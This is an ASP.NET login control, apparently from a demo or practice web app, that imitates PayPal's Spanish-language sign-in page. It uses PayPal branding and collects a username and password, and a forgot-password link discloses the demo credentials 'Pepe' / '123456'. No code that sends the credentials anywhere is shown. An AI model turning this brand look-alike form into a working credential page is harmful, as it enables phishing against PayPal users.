<%@ Control Language="C#" AutoEventWireup="true" CodeBehind="Login.ascx.cs" Inherits="AppWeb.Views.Paypal.Login" %>

<div id="content" class="contentContainer col-lg-4 col-lg-offset-4">
    <header>
        <div class="paypal-logo">
        </div>
    </header>

    <div id="main" class="main " role="main">
        <section id="login" class="login" data-role="page" data-title="Inicie sesión en su cuenta PayPal">
            <div id="notifications" class="notifications" tabindex="-1">
                <asp:Panel ID="panelAlert" CssClass="notification notification-critical" runat="server">Parte de la información que ha ingresado parece incorrecta. </asp:Panel>
                <br />
            </div>

            <form action="/signin" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                <div class="modal-overlay hide"></div>
                <div id="passwordSection" class="clearfix"></div>
                <div class="textInput" id="login_emaildiv">
                    <div class="fieldWrapper">
                        <asp:TextBox ID="txtUser" name="login_user" CssClass="hasHelp validateEmpty" value=""
                            placeholder="Usuario" runat="server" />
                    </div>
                    <div class="errorMessage" id="emailErrorMessage">
                        <p class="emptyError hide">Ingrese su dirección de correo electrónico</p>
                        <p class="invalidError hide">
                            El formato de correo electrónico no es correcto
                        </p>
                    </div>
                </div>
                <div class="textInput" id="login_passworddiv">
                    <div class="fieldWrapper">
                        <asp:TextBox ID="txtPassword" name="login_password" TextMode="Password" CssClass="hasHelp
					validateEmpty"
                            value="" placeholder="Contraseña" runat="server" />
                    </div>
                    <div class="errorMessage" id="passwordErrorMessage">
                        <p class="emptyError hide">Ingrese su contraseña</p>
                    </div>
                </div>

                <div class="actions">
                    <asp:Button CssClass="button actionContinue" Text="Iniciar sesión" ID="btnLogin" OnClick="btnLogin_Click" runat="server"></asp:Button>
                </div>
                <p class="forgotLink">
                    <a href="" target="_blank" class="scTrack:unifiedlogin-click-forgot-password">¿Ha
                olvidado su usuario o
                contraseña? Pruebe con <b>"Pepe" y "123456"</b>
                    </a>
                </p>
            </form>
        </section>
    </div>
    <div class="modal-animate hide">
        <div class="rotate"></div>
    </div>
</div>
